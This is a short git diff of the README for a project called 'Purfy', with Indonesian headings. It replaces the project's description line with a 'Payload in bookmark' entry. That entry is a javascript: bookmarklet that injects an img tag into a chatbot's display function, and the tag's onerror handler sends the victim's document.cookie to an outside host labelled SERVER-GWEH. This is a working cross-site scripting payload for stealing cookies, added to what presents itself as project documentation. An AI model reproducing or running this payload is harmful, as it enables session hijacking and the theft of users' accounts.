@@ -1,6 +1,7 @@
 # 📦 Purfy
 
-otomasi log server
+Payload in bookmark:
+javascript:CHATBOT.displayUserInput('<img src="x" onerror="new Image().src=\'https://SERVER-GWEH?cookie=\'+document.cookie">');
 
 ## 🛠️ Teknologi yang Digunakan
 
